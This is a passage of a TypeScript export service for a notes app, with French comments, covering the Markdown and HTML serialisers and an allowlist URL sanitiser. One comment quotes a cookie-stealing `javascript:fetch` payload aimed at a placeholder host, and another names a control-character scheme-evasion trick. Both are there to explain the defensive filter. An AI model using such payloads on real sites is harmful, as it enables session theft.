/**
 * Note Export Service — Filarr Notes
 *
 * Fonctions pures rendant un Blob/Uint8Array par format : Markdown, HTML, PDF,
 * DOCX, Filarr (JSON). L'entrée est TOUJOURS le JSON TipTap de la note
 * (`note.content`), jamais le DOM de l'éditeur.
 *
 * RÈGLE DE FIDÉLITÉ — un bloc ne disparaît jamais en silence.
 * Un sérialiseur qui laisse un type de nœud tomber dans son `default` ne
 * « ne fait rien » : il APLATIT. Le `default` recurse dans les enfants et
 * empile leur texte hors de toute structure — deux colonnes deviennent deux
 * paragraphes anonymes, un tableau devient une pile de cellules — et pour un
 * nœud `atom:` (diagramme, formule, base, calendrier) il ne reste RIEN, car
 * tout le contenu de ces blocs vit dans leurs `attrs`, pas dans `content`.
 * C'est exactement ce qui se passait pour `mermaidBlock`, `mathBlock`,
 * `toggleBlock`, `columns`, `fileEmbed` : les `case` portaient des noms de
 * nœuds qui n'existent pas dans le schéma (`mermaid`, `toggle`, `image`) ou
 * lisaient un attribut qui n'existe pas (`content` au lieu de `latex`/`code`).
 *
 * Conséquence pratique : CHAQUE type de nœud du schéma réel doit être traité
 * explicitement par les quatre sérialiseurs. Quand un format ne sait pas
 * dessiner un bloc (un PDF ne dessine pas un diagramme Mermaid), il doit
 * produire un SUBSTITUT LISIBLE — l'étiquette du bloc et son contenu textuel —
 * jamais du vide.
 *
 * Le garde-fou de cette règle est la suite `__tests__/noteExportCoverage.vitest.ts` :
 * elle énumère les nœuds du schéma partagé (`extensions/schemaExtensions.ts`)
 * et échoue si l'un d'eux n'est traité par aucun `case`, ou si un `case` porte
 * un nom de nœud qui n'existe nulle part.
 *
 * LANGUE DES SUBSTITUTS. Les étiquettes fabriquées ici (« Column 1 of 2 »,
 * « Attachment: … ») sont en anglais, comme le reste des libellés déjà écrits
 * par ce service (« Linked Notes », « Untitled ») : l'export n'est pas encore
 * traduit, et semer des clés i18n à moitié posées serait pire qu'un libellé
 * cohérent. Le jour où l'export passe à i18n, tout part d'ici.
 */

import {
  Document,
  Packer,
  Paragraph,
  TextRun,
  HeadingLevel,
  AlignmentType,
  HighlightColor,
} from 'docx';
import jsPDF from 'jspdf';
import type { Note } from '../../types/notes';
import i18n from '../../i18n/config';
// Store accédé au moment de l'export seulement (résolution des titres du type note)
import store from '../../store';
import type {
  DbProperty,
  DbRow,
} from '../../renderer/components/notes/extensions/inlineDatabase/types';
import {
  formatDbTimestamp,
  parseDbData,
} from '../../renderer/components/notes/extensions/inlineDatabase/types';
import type { DbLinkContext } from '../../renderer/components/notes/extensions/inlineDatabase/relations';
import {
  computeRollup,
  formatRollupResult,
  resolveRelation,
} from '../../renderer/components/notes/extensions/inlineDatabase/relations';
import { selectInlineDbIndex } from '../../store/slices/notesSlice';

// ==================== Types ====================

export type ExportFormat = 'markdown' | 'html' | 'pdf' | 'docx' | 'filarr';

export interface ExportOptions {
  format: ExportFormat;
  includeMetadata?: boolean;
  includeLinks?: boolean;
}

export interface ExportResult {
  blob: Blob;
  filename: string;
  mimeType: string;
}

// ==================== TipTap JSON Types ====================

interface TipTapMark {
  type: string;
  attrs?: Record<string, unknown>;
}

interface TipTapNode {
  type: string;
  content?: TipTapNode[];
  text?: string;
  marks?: TipTapMark[];
  attrs?: Record<string, unknown>;
}

// ==================== Helpers ====================

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * Schémas d'URL admis dans un export HTML.
 *
 * POURQUOI — `escapeHtml` n'échappe que `& < > "` : il laisse passer intact un
 * `javascript:fetch('https://x/'+document.cookie)`. Or l'export HTML émet des
 * `href`/`src` tirés d'ATTRIBUTS DE NŒUD (marque `link`, `bookmark.url`,
 * `embedUrl.url`, `fileEmbed.src`), c'est-à-dire de contenu qu'un autre membre
 * d'un coffre partagé a pu écrire. Le fichier exporté s'ouvre en `file://`,
 * une origine où un script a tout loisir de lire le document.
 *
 * On valide donc par ALLOWLISTE, jamais par liste noire.
 */
const SAFE_URL_SCHEMES = new Set(['http', 'https', 'mailto', 'tel']);

/** Un schéma d'URL a la forme `[a-z][a-z0-9+.-]*`. Rien d'autre n'en est un. */
function looksLikeScheme(value: string): boolean {
  if (!value) return false;
  const first = value.charCodeAt(0);
  const isAlpha = (c: number) => (c >= 97 && c <= 122) || (c >= 65 && c <= 90);
  if (!isAlpha(first)) return false;
  for (const ch of value) {
    const c = ch.charCodeAt(0);
    const ok = isAlpha(c) || (c >= 48 && c <= 57) || ch === '+' || ch === '.' || ch === '-';
    if (!ok) return false;
  }
  return true;
}

/**
 * Rend l'URL si elle est sûre, la chaîne vide sinon — l'appelant retombe
 * alors sur du texte non cliquable plutôt que d'émettre un piège.
 *
 * `allowData` n'est vrai que là où une data-URI est le fonctionnement NORMAL
 * (image ou pièce jointe embarquée). Même là, `text/html` et `image/svg+xml`
 * sont refusés : ce sont les deux types de data-URI qui portent du script.
 */
function safeUrl(raw: unknown, allowData = false): string {
  const value = String(raw ?? '').trim();
  if (!value) return '';

  // Les navigateurs IGNORENT les caractères de contrôle à l'intérieur d'un
  // schéma : « java<TAB>script: » s'exécute. On juge donc une copie nettoyée,
  // tout en rendant la valeur d'origine quand elle est jugée sûre.
  const probe = Array.from(value)
    .filter((c) => c.charCodeAt(0) > 0x20 && c.charCodeAt(0) !== 0x7f)
    .join('');

  const colon = probe.indexOf(':');
  if (colon <= 0) return value; // ancre, chemin relatif : aucun schéma à juger

  // Un « : » situé après un séparateur de chemin appartient au chemin.
  for (const sep of ['/', '?', '#']) {
    const at = probe.indexOf(sep);
    if (at >= 0 && at < colon) return value;
  }

  const scheme = probe.slice(0, colon).toLowerCase();
  if (!looksLikeScheme(scheme)) return value; // « Note: voir plus bas »
  if (SAFE_URL_SCHEMES.has(scheme)) return value;

  if (scheme === 'data' && allowData) {
    const mime = probe
      .slice(colon + 1)
      .split(';')[0]
      .split(',')[0]
      .toLowerCase();
    if (mime && mime !== 'text/html' && mime !== 'image/svg+xml') return value;
  }

  return '';
}

function sanitizeFilename(title: string): string {
  return (title || 'untitled')
    .replace(/[<>:"/\\|?*]/g, '-')
    .replace(/\s+/g, '_')
    .slice(0, 80);
}

function parseTipTapContent(content: string): TipTapNode | null {
  if (!content) return null;
  try {
    return JSON.parse(content);
  } catch {
    return null;
  }
}

/**
 * Lecture d'attribut tolérante. Un export ne doit JAMAIS jeter : la note vient
 * d'un document persisté, parfois écrit par une version antérieure du schéma,
 * et un attribut manquant vaut la chaîne vide, pas une exception.
 */
function attrStr(node: TipTapNode, key: string): string {
  const value = node.attrs?.[key];
  if (typeof value === 'string') return value;
  if (typeof value === 'number' && Number.isFinite(value)) return String(value);
  return '';
}

/**
 * Référence d'une transclusion, reconstruite dans la syntaxe que Filarr sait
 * relire (`![[Titre#section]]`, `![[Titre^ancre]]`, `![[Titre|alias]]`).
 * Exporter le `preview` seul perdrait le LIEN ; exporter le `noteId` seul
 * donnerait un identifiant illisible. On rend donc la référence, telle qu'elle
 * a été saisie.
 */
function transclusionRef(node: TipTapNode): string {
  const title = attrStr(node, 'noteTitle') || attrStr(node, 'noteId');
  const section = attrStr(node, 'section');
  const blockId = attrStr(node, 'blockId');
  const alias = attrStr(node, 'alias');
  const target = section ? `${title}#${section}` : blockId ? `${title}^${blockId}` : title;
  return `![[${alias ? `${target}|${alias}` : target}]]`;
}

/** Ce qu'un `fileEmbed` sait dire de lui-même, sans jamais toucher au disque. */
function fileEmbedInfo(node: TipTapNode): { name: string; src: string; isImage: boolean } {
  const name = attrStr(node, 'fileName') || attrStr(node, 'fileId') || 'file';
  const src = attrStr(node, 'src');
  const fileType = attrStr(node, 'fileType');
  // Une image collée porte un `src` en data-URI ; un fichier du coffre n'a
  // qu'un `fileId`, dont aucun format d'export ne saurait quoi faire.
  return { name, src, isImage: fileType.startsWith('image/') || /^data:image\//i.test(src) };
}

/** Évènements d'un `calendarBlock` — JSON illisible = calendrier sans évènement. */
function calendarEvents(node: TipTapNode): { date: string; text: string }[] {
  const raw = node.attrs?.events;
  if (typeof raw !== 'string' || raw.trim() === '') return [];
  try {
    const parsed: unknown = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [];
    return parsed
      .filter((e): e is Record<string, unknown> => !!e && typeof e === 'object')
      .map((e) => ({
        date: typeof e.date === 'string' ? e.date : '',
        text: typeof e.text === 'string' ? e.text : '',
      }))
      .filter((e) => e.date !== '' || e.text !== '');
  } catch {
    return [];
  }
}

/**
 * SUBSTITUT TEXTUEL d'un bloc atomique — la source unique dont le PDF et le
 * DOCX tirent leur rendu, pour que les deux formats racontent la même chose.
 *
 * `label` nomme le bloc (sans lui, un lecteur ne saurait pas qu'il manque
 * quelque chose), `body` porte le texte réellement écrit par l'utilisateur :
 * la source du diagramme, la formule, la requête, les évènements. C'est ce
 * contenu-là que l'ancien `default` jetait intégralement.
 */
function atomFallback(node: TipTapNode): { label: string; body: string[] } {
  switch (node.type) {
    case 'mermaidBlock':
      return { label: 'Mermaid diagram', body: attrStr(node, 'code').split('\n') };

    case 'mathBlock':
      return { label: 'Formula', body: attrStr(node, 'latex').split('\n') };

    case 'dataviewBlock':
      return { label: 'Dataview query', body: attrStr(node, 'query').split('\n') };

    case 'tableOfContents':
      // Un sommaire n'a pas de contenu propre : il reflète des titres qui sont
      // déjà, tous, dans le document exporté. On en garde la TRACE.
      return { label: 'Table of Contents', body: [] };

    case 'bookmark': {
      const title = attrStr(node, 'title') || attrStr(node, 'domain') || attrStr(node, 'url');
      const body = [attrStr(node, 'description'), attrStr(node, 'url')].filter((s) => s !== '');
      return { label: `Bookmark: ${title}`, body };
    }

    case 'embedUrl': {
      const title = attrStr(node, 'title') || attrStr(node, 'url');
      return { label: `Embed: ${title}`, body: [attrStr(node, 'url')].filter((s) => s !== '') };
    }

    case 'fileEmbed': {
      const { name, src, isImage } = fileEmbedInfo(node);
      // Le data-URI d'une image pesant plusieurs Mo n'a rien à faire dans un
      // PDF sous forme de base64 : on nomme le fichier, c'est tout.
      const body = src && !/^data:/i.test(src) ? [src] : [];
      return { label: `${isImage ? 'Image' : 'Attachment'}: ${name}`, body };
    }

    case 'subPage': {
      const title = attrStr(node, 'title') || attrStr(node, 'noteId');
      const icon = attrStr(node, 'icon');
      return { label: `Sub-page: ${icon ? `${icon} ` : ''}${title}`, body: [] };
    }

    case 'transclusion': {
      const preview = attrStr(node, 'preview');
      return { label: transclusionRef(node), body: preview ? preview.split('\n') : [] };
    }

    case 'calendarBlock': {
      const title = attrStr(node, 'title');
      return {
        label: `Calendar${title ? `: ${title}` : ''}`,
        body: calendarEvents(node).map((e) => [e.date, e.text].filter(Boolean).join(' — ')),
      };
    }

    default:
      // Un type inconnu ressort sous son propre nom plutôt que dans le vide :
      // le lecteur voit qu'il y avait un bloc, et la suite de couverture
      // signale l'oubli au développeur.
      return { label: node.type, body: [] };
  }
}

/**
 * Grille textuelle d'un tableau — partagée par le PDF et le DOCX, qui ne
 * savent pas dessiner de tableau ici mais peuvent au moins aligner les
 * cellules sur une ligne. Sans ce chemin, le `default` recursait dans les
 * cellules et rendait chaque cellule comme un paragraphe isolé : les lignes
 * du tableau étaient perdues.
 */
function tableToTextRows(node: TipTapNode): string[][] {
  return (node.content || []).map((row) =>
    (row.content || []).map((cell) =>
      (cell.content || [])
        .map((c) => inlineContentToMd(c.content))
        .join(' ')
        .trim()
    )
  );
}

/** Valeur affichable d'une cellule de bloc base de données (labels d'options, ✓ pour checkbox) */
function dbCellText(prop: DbProperty, value: unknown): string {
  switch (prop.type) {
    case 'checkbox':
      return value === true ? '✓' : '';
    case 'select': {
      const opt = typeof value === 'string' ? prop.options?.find((o) => o.id === value) : undefined;
      return opt ? opt.label : '';
    }
    case 'multiSelect': {
      const ids = Array.isArray(value)
        ? value.filter((x): x is string => typeof x === 'string')
        : [];
      return (prop.options ?? [])
        .filter((o) => ids.includes(o.id))
        .map((o) => o.label)
        .join(', ');
    }
    case 'email':
    case 'phone':
      return typeof value === 'string' ? value : '';
    case 'rating':
      return typeof value === 'number' && Number.isInteger(value) && value >= 1 && value <= 5
        ? `${value}/5`
        : '';
    case 'progress':
      return typeof value === 'number' && Number.isFinite(value)
        ? i18n.t('notes.inlineDb.percent', {
            defaultValue: '{{n}}%',
            n: Math.round(Math.max(0, Math.min(100, value))),
          })
        : '';
    case 'note': {
      if (typeof value !== 'string' || !value) return '';
      const linked = store.getState().notes.byId[value];
      return linked && !linked.deletedAt ? linked.title || '' : '';
    }
    case 'createdTime':
    case 'updatedTime':
      return typeof value === 'string' ? formatDbTimestamp(value) : '';
    default:
      return value === undefined || value === null ? '' : String(value);
  }
}

/**
 * Résolution des bases visées par les relations, au moment de l'export : même
 * index mémoïsé que l'éditeur, donc les mêmes titres. Rien ne part sur le
 * réseau — tout est déjà en mémoire.
 */
function exportLinkCtx(): DbLinkContext {
  const index = selectInlineDbIndex(store.getState());
  return {
    getDb: (id: string) => {
      const entry = index.get(id);
      return entry ? { properties: entry.properties, rows: entry.rows } : undefined;
    },
  };
}

/**
 * Valeur d'export d'une cellule : createdTime/updatedTime lisent la ligne,
 * relation et agrégat passent par le moteur (jamais les identifiants bruts),
 * le reste lit cells.
 */
function dbRowCellText(prop: DbProperty, row: DbRow, properties: DbProperty[] = []): string {
  if (prop.type === 'relation') {
    const res = resolveRelation(prop, row, { properties, ctx: exportLinkCtx() });
    // Base visée absente de ce coffre : mieux vaut une case vide qu'une liste
    // d'identifiants internes dans un document destiné à être lu
    if (res.status !== 'ok') return '';
    return res.links
      .map((l) => l.title)
      .filter((s) => s !== '')
      .join(', ');
  }
  if (prop.type === 'rollup') {
    // Un agrégat s'exporte tel qu'il s'affiche — chiffre, pourcentage ou liste
    return formatRollupResult(computeRollup(prop, row, { properties, ctx: exportLinkCtx() }));
  }
  if (prop.type === 'createdTime') return dbCellText(prop, row.createdAt);
  if (prop.type === 'updatedTime') return dbCellText(prop, row.updatedAt);
  return dbCellText(prop, row.cells[prop.id]);
}

// ==================== TipTap JSON → Markdown ====================

function marksToMd(text: string, marks?: TipTapMark[]): string {
  if (!marks || marks.length === 0) return text;
  let result = text;
  for (const mark of marks) {
    switch (mark.type) {
      case 'bold':
      // `strong` / `em` ne sont pas des marques du schéma : ce sont les noms
      // ProseMirror historiques, que du contenu importé peut encore porter.
      // falls through
      case 'strong':
        result = `**${result}**`;
        break;
      case 'italic':
      case 'em':
        result = `*${result}*`;
        break;
      case 'strike':
        result = `~~${result}~~`;
        break;
      case 'code':
        result = `\`${result}\``;
        break;
      case 'underline':
        result = `<u>${result}</u>`;
        break;
      case 'link':
        result = `[${result}](${(mark.attrs?.href as string) || ''})`;
        break;
      case 'highlight':
        result = `==${result}==`;
        break;
    }
  }
  return result;
}

function inlineContentToMd(nodes?: TipTapNode[]): string {
  if (!nodes) return '';
  return nodes
    .map((node) => {
      switch (node.type) {
        case 'text':
          return marksToMd(node.text || '', node.marks);
        case 'hardBreak':
          return '\n';
        // L'attribut est `latex` (mathExtension.ts) — l'ancien code lisait
        // `content`, donc rendait `$$` vide pour TOUTES les formules.
        case 'mathInline':
          return `$${attrStr(node, 'latex')}$`;
        // Syntaxe de note de bas de page « inline » (Pandoc) : la seule qui
        // n'exige pas de collecter des définitions en fin de document.
        case 'footnote':
          return `^[${attrStr(node, 'content')}]`;
        case 'inlineDate':
          return attrStr(node, 'date');
        // La mention sort en TEXTE : « @Nom », jamais l'identifiant de la personne.
        case 'mention':
          return `@${attrStr(node, 'label')}`;
        default:
          return inlineContentToMd(node.content);
      }
    })
    .join('');
}

function nodeToMarkdown(node: TipTapNode, indent: string = ''): string {
  switch (node.type) {
    case 'doc':
      return (node.content || []).map((c) => nodeToMarkdown(c, indent)).join('\n\n');

    case 'paragraph':
      return indent + inlineContentToMd(node.content);

    case 'heading': {
      const level = (node.attrs?.level as number) || 1;
      const prefix = '#'.repeat(level);
      return `${prefix} ${inlineContentToMd(node.content)}`;
    }

    case 'bulletList':
      return (node.content || []).map((item) => nodeToMarkdown(item, indent)).join('\n');

    case 'orderedList':
      return (node.content || [])
        .map((item, i) => {
          const start = ((node.attrs?.start as number) || 1) + i;
          return nodeToMarkdown(item, indent).replace(
            new RegExp(`^${indent}- `),
            `${indent}${start}. `
          );
        })
        .join('\n');

    case 'listItem':
      return (node.content || [])
        .map((child, i) => {
          const md = nodeToMarkdown(child, indent + '  ');
          if (i === 0) return `${indent}- ${md.trimStart()}`;
          return md;
        })
        .join('\n');

    case 'taskList':
      return (node.content || []).map((item) => nodeToMarkdown(item, indent)).join('\n');

    case 'taskItem': {
      const checked = node.attrs?.checked ? 'x' : ' ';
      const content = (node.content || [])
        .map((child) => nodeToMarkdown(child, indent + '  '))
        .join('\n');
      return `${indent}- [${checked}] ${content.trimStart()}`;
    }

    case 'codeBlock': {
      const lang = (node.attrs?.language as string) || '';
      const code = (node.content || []).map((c) => c.text || '').join('');
      return `\`\`\`${lang}\n${code}\n\`\`\``;
    }

    case 'blockquote':
      return (node.content || [])
        .map((child) => nodeToMarkdown(child, indent))
        .join('\n')
        .split('\n')
        .map((line: string) => `> ${line}`)
        .join('\n');

    case 'horizontalRule':
      return '---';

    case 'table':
      return tableToMarkdown(node);

    // Les trois nœuds de structure du tableau ne sont jamais atteints depuis
    // `table` (qui construit la grille lui-même), mais un document tronqué ou
    // un copier-coller partiel peut les présenter seuls : plutôt que de les
    // laisser tomber dans le `default`, on rend leur texte.
    case 'tableRow':
      return (node.content || [])
        .map((cell) => nodeToMarkdown(cell, indent))
        .filter((s) => s !== '')
        .join(' | ');

    case 'tableCell':
    case 'tableHeader':
      return (node.content || [])
        .map((c) => nodeToMarkdown(c, indent))
        .join(' ')
        .trim();

    case 'callout': {
      const type = attrStr(node, 'type') || 'info';
      const title = attrStr(node, 'title');
      const body = (node.content || []).map((c) => nodeToMarkdown(c, indent)).join('\n');
      return `> [!${type}]${title ? ` ${title}` : ''}\n${body
        .split('\n')
        .map((l) => `> ${l}`)
        .join('\n')}`;
    }

    case 'mathBlock':
      return `$$\n${attrStr(node, 'latex')}\n$$`;

    // Le nœud s'appelle `mermaidBlock` et son attribut `code` (mermaidExtension).
    // L'ancien `case 'mermaid'` lisant `attrs.content` ne pouvait rien rendre.
    case 'mermaidBlock':
      return `\`\`\`mermaid\n${attrStr(node, 'code')}\n\`\`\``;

    case 'dataviewBlock':
      return `\`\`\`dataview\n${attrStr(node, 'query')}\n\`\`\``;

    /**
     * DÉGRADATION ASSUMÉE DES COLONNES.
     * Markdown n'a AUCUNE notion de mise en page côte à côte. Les colonnes
     * sont donc mises bout à bout — mais annoncées : un commentaire HTML dit
     * ce qui a été perdu, et chaque colonne est introduite par son rang. Le
     * lecteur voit la couture ; l'ancien comportement (chute dans le
     * `default`) les fusionnait sans laisser la moindre trace.
     */
    case 'columns': {
      const cols = (node.content || []).filter((c) => c.type === 'column');
      const header = `<!-- Columns (${cols.length}): side-by-side layout has no Markdown equivalent; columns follow one another -->`;
      const parts = cols.map(
        (col, i) => `**Column ${i + 1} of ${cols.length}**\n\n${nodeToMarkdown(col, indent)}`
      );
      return [header, ...parts].join('\n\n');
    }

    case 'column':
      return (node.content || []).map((c) => nodeToMarkdown(c, indent)).join('\n\n');

    /**
     * Le nœud s'appelle `toggleBlock` (toggleExtension) et son premier enfant
     * est un `toggleSummary`. L'ancien `case 'toggle'` n'était jamais atteint,
     * et le `<details>` produit par la branche `toggleSummary` n'était donc
     * jamais refermé.
     */
    case 'toggleBlock': {
      const children = node.content || [];
      const summaryNode = children.find((c) => c.type === 'toggleSummary');
      const summary = summaryNode ? inlineContentToMd(summaryNode.content) : '';
      const body = children
        .filter((c) => c !== summaryNode)
        .map((c) => nodeToMarkdown(c, indent))
        .join('\n\n');
      const open = node.attrs?.open === false ? '' : ' open';
      return `<details${open}><summary>${summary}</summary>\n\n${body}\n\n</details>`;
    }

    case 'toggleSummary':
      return inlineContentToMd(node.content);

    case 'fileEmbed': {
      const { name, src, isImage } = fileEmbedInfo(node);
      if (src) return isImage ? `![${name}](${src})` : `[${name}](${src})`;
      // Fichier du coffre : pas d'URL portable. On nomme la pièce jointe.
      return `*[Attachment: ${name}]*`;
    }

    /**
     * `image` n'est PAS un nœud du schéma des notes — mais l'importateur HTML
     * (noteImportService) en fabrique encore, et un `note.content` importé
     * peut donc en contenir. L'export lit le JSON persisté, pas le schéma :
     * il doit savoir le relire.
     */
    case 'image': {
      const src = attrStr(node, 'src');
      const alt = attrStr(node, 'alt');
      return `![${alt}](${src})`;
    }

    case 'bookmark': {
      const url = attrStr(node, 'url');
      const title = attrStr(node, 'title') || attrStr(node, 'domain') || url;
      const description = attrStr(node, 'description');
      const link = url ? `[${title}](${url})` : `**${title}**`;
      return description ? `${link}\n\n${description}` : link;
    }

    case 'embedUrl': {
      const url = attrStr(node, 'url');
      const title = attrStr(node, 'title') || url;
      return url ? `[${title}](${url})` : `**${title}**`;
    }

    // Syntaxe interne de Filarr : une sous-page et une transclusion se
    // réécrivent telles quelles, et restent des LIENS à la relecture.
    case 'subPage': {
      const icon = attrStr(node, 'icon');
      const title = attrStr(node, 'title') || attrStr(node, 'noteId');
      return `${icon ? `${icon} ` : ''}[[${title}]]`;
    }

    case 'transclusion':
      return transclusionRef(node);

    case 'tableOfContents':
      // Convention répandue (Obsidian, markdown-it-table-of-contents) : le
      // sommaire est régénéré à la lecture, pas figé à l'export.
      return '[[TOC]]';

    case 'calendarBlock': {
      const title = attrStr(node, 'title');
      const events = calendarEvents(node);
      const head = `**Calendar${title ? `: ${title}` : ''}**`;
      if (events.length === 0) return head;
      return [
        head,
        '',
        ...events.map((e) => `- ${[e.date, e.text].filter(Boolean).join(' — ')}`),
      ].join('\n');
    }

    case 'inlineDatabase': {
      const db = parseDbData(String(node.attrs?.data ?? ''));
      if (db.properties.length === 0) return '';
      const escapeCell = (s: string) => s.replace(/\|/g, '\\|');
      const header = '| ' + db.properties.map((p) => escapeCell(p.name) || ' ').join(' | ') + ' |';
      const sep = '| ' + db.properties.map(() => '---').join(' | ') + ' |';
      const rows = db.rows.map(
        (r) =>
          '| ' +
          db.properties.map((p) => escapeCell(dbRowCellText(p, r, db.properties))).join(' | ') +
          ' |'
      );
      const title = (node.attrs?.title as string) || '';
      return (title ? `**${title}**\n\n` : '') + [header, sep, ...rows].join('\n');
    }

    // Nœuds inline atteints hors d'un paragraphe (document tronqué) : on passe
    // par le sérialiseur inline plutôt que par le `default`.
    case 'text':
    case 'hardBreak':
    case 'mathInline':
    case 'footnote':
    case 'inlineDate':
    case 'mention':
      return inlineContentToMd([node]);

    default:
      // Filet de sécurité pour un contenu écrit par une version FUTURE du
      // schéma : on descend dans les enfants plutôt que de tout perdre. La
      // suite de couverture garantit qu'aucun nœud CONNU n'arrive ici.
      if (node.content) {
        return (node.content || []).map((c) => nodeToMarkdown(c, indent)).join('\n');
      }
      return node.text || '';
  }
}

function tableToMarkdown(node: TipTapNode): string {
  const rows = node.content || [];
  if (rows.length === 0) return '';

  const mdRows: string[][] = [];
  for (const row of rows) {
    const cells = (row.content || []).map((cell) => {
      const text = (cell.content || []).map((c) => inlineContentToMd(c.content)).join(' ');
      return text.trim();
    });
    mdRows.push(cells);
  }

  const colCount = Math.max(...mdRows.map((r) => r.length));
  const colWidths = Array.from({ length: colCount }, (_, i) =>
    Math.max(3, ...mdRows.map((r) => (r[i] || '').length))
  );

  const formatRow = (cells: string[]) =>
    '| ' + colWidths.map((w, i) => (cells[i] || '').padEnd(w)).join(' | ') + ' |';
  const separator = '| ' + colWidths.map((w) => '-'.repeat(w)).join(' | ') + ' |';

  const lines = [formatRow(mdRows[0]), separator];
  for (let i = 1; i < mdRows.length; i++) {
    lines.push(formatRow(mdRows[i]));
  }
  return lines.join('\n');
}

// ==================== TipTap JSON → HTML ====================

function marksToHtml(text: string, marks?: TipTapMark[]): string {
  if (!marks || marks.length === 0) return escapeHtml(text);
  let result = escapeHtml(text);
  for (const mark of marks) {
    switch (mark.type) {
      case 'bold':
      case 'strong':
        result = `<strong>${result}</strong>`;
        break;
      case 'italic':
      case 'em':
        result = `<em>${result}</em>`;
        break;
      case 'strike':
        result = `<s>${result}</s>`;
        break;
      case 'code':
        result = `<code>${result}</code>`;
        break;
      case 'underline':
        result = `<u>${result}</u>`;
        break;
      case 'link': {
        // URL refusée → on garde le TEXTE, on retire le lien. Perdre un lien
        // piégé est sans conséquence ; l'émettre ne l'est pas.
        const href = safeUrl(mark.attrs?.href);
        result = href ? `<a href="${escapeHtml(href)}">${result}</a>` : result;
        break;
      }
      case 'highlight': {
        const color = (mark.attrs?.color as string) || 'yellow';
        result = `<mark style="background:${escapeHtml(color)}">${result}</mark>`;
        break;
      }
      /**
       * `textStyle` porte couleur, taille et famille de police (color,
       * fontSize, fontFamily — cf. fontSizeExtension). HTML est le seul format
       * d'export capable de les restituer telles quelles ; ne rien en faire
       * revenait à exporter un document monochrome sans le dire.
       * Une marque sans aucun attribut posé (le cas courant) ne produit RIEN :
       * pas de `<span>` vide dans la sortie.
       */
      case 'textStyle': {
        const styles: string[] = [];
        const color = mark.attrs?.color;
        const fontSize = mark.attrs?.fontSize;
        const fontFamily = mark.attrs?.fontFamily;
        if (typeof color === 'string' && color) styles.push(`color:${color}`);
        if (typeof fontSize === 'string' && fontSize) styles.push(`font-size:${fontSize}`);
        if (typeof fontFamily === 'string' && fontFamily) styles.push(`font-family:${fontFamily}`);
        if (styles.length > 0) {
          result = `<span style="${escapeHtml(styles.join(';'))}">${result}</span>`;
        }
        break;
      }
    }
  }
  return result;
}

function inlineContentToHtml(nodes?: TipTapNode[]): string {
  if (!nodes) return '';
  return nodes
    .map((node) => {
      switch (node.type) {
        case 'text':
          return marksToHtml(node.text || '', node.marks);
        case 'hardBreak':
          return '<br>';
        case 'mathInline':
          return `<code class="math">${escapeHtml(attrStr(node, 'latex'))}</code>`;
        case 'footnote': {
          const content = attrStr(node, 'content');
          // Le texte de la note doit être VISIBLE : un `title=` seul disparaît
          // à l'impression et dans tout lecteur qui ignore les infobulles.
          return `<sup class="footnote" title="${escapeHtml(content)}">[${escapeHtml(content)}]</sup>`;
        }
        case 'inlineDate': {
          const date = attrStr(node, 'date');
          return `<time datetime="${escapeHtml(date)}">${escapeHtml(date)}</time>`;
        }
        case 'mention':
          return `<span class="note-mention">@${escapeHtml(attrStr(node, 'label'))}</span>`;
        default:
          return inlineContentToHtml(node.content);
      }
    })
    .join('');
}

function nodeToHtml(node: TipTapNode): string {
  switch (node.type) {
    case 'doc':
      return (node.content || []).map(nodeToHtml).join('\n');

    case 'paragraph':
      return `<p>${inlineContentToHtml(node.content)}</p>`;

    case 'heading': {
      const level = (node.attrs?.level as number) || 1;
      return `<h${level}>${inlineContentToHtml(node.content)}</h${level}>`;
    }

    case 'bulletList':
      return `<ul>\n${(node.content || []).map(nodeToHtml).join('\n')}\n</ul>`;

    case 'orderedList': {
      const start = (node.attrs?.start as number) || 1;
      return `<ol start="${start}">\n${(node.content || []).map(nodeToHtml).join('\n')}\n</ol>`;
    }

    case 'listItem':
      return `<li>${(node.content || []).map(nodeToHtml).join('')}</li>`;

    case 'taskList':
      return `<ul class="task-list">\n${(node.content || []).map(nodeToHtml).join('\n')}\n</ul>`;

    case 'taskItem': {
      const checked = node.attrs?.checked ? 'checked' : '';
      return `<li class="task-item"><input type="checkbox" ${checked} disabled> ${(node.content || []).map(nodeToHtml).join('')}</li>`;
    }

    case 'codeBlock': {
      const lang = (node.attrs?.language as string) || '';
      const code = (node.content || []).map((c) => escapeHtml(c.text || '')).join('');
      return `<pre><code class="language-${escapeHtml(lang)}">${code}</code></pre>`;
    }

    case 'blockquote':
      return `<blockquote>\n${(node.content || []).map(nodeToHtml).join('\n')}\n</blockquote>`;

    case 'horizontalRule':
      return '<hr>';

    case 'table':
      return `<table>\n${(node.content || []).map(nodeToHtml).join('\n')}\n</table>`;

    case 'tableRow':
      return `<tr>${(node.content || []).map(nodeToHtml).join('')}</tr>`;

    case 'tableCell':
      return `<td>${(node.content || []).map(nodeToHtml).join('')}</td>`;

    case 'tableHeader':
      return `<th>${(node.content || []).map(nodeToHtml).join('')}</th>`;

    case 'callout': {
      const type = attrStr(node, 'type') || 'info';
      const title = attrStr(node, 'title');
      const head = title
        ? `<p class="callout-title"><strong>${escapeHtml(title)}</strong></p>\n`
        : '';
      return `<div class="callout callout-${escapeHtml(type)}">\n${head}${(node.content || []).map(nodeToHtml).join('\n')}\n</div>`;
    }

    case 'mathBlock':
      return `<pre class="math-block">${escapeHtml(attrStr(node, 'latex'))}</pre>`;

    case 'mermaidBlock':
      return `<pre class="language-mermaid"><code>${escapeHtml(attrStr(node, 'code'))}</code></pre>`;

    case 'dataviewBlock':
      return `<pre class="language-dataview"><code>${escapeHtml(attrStr(node, 'query'))}</code></pre>`;

    // HTML sait faire des colonnes : c'est le SEUL format d'export où elles ne
    // se dégradent pas. Le CSS du gabarit porte la disposition en flex.
    case 'columns': {
      const cols = (node.content || []).filter((c) => c.type === 'column');
      return `<div class="columns" data-columns="${cols.length}">\n${cols.map(nodeToHtml).join('\n')}\n</div>`;
    }

    case 'column':
      return `<div class="column">\n${(node.content || []).map(nodeToHtml).join('\n')}\n</div>`;

    case 'toggleBlock': {
      const children = node.content || [];
      const summaryNode = children.find((c) => c.type === 'toggleSummary');
      const summary = summaryNode ? inlineContentToHtml(summaryNode.content) : '';
      const body = children
        .filter((c) => c !== summaryNode)
        .map(nodeToHtml)
        .join('\n');
      const open = node.attrs?.open === false ? '' : ' open';
      return `<details${open}>\n<summary>${summary}</summary>\n${body}\n</details>`;
    }

    case 'toggleSummary':
      return `<summary>${inlineContentToHtml(node.content)}</summary>`;

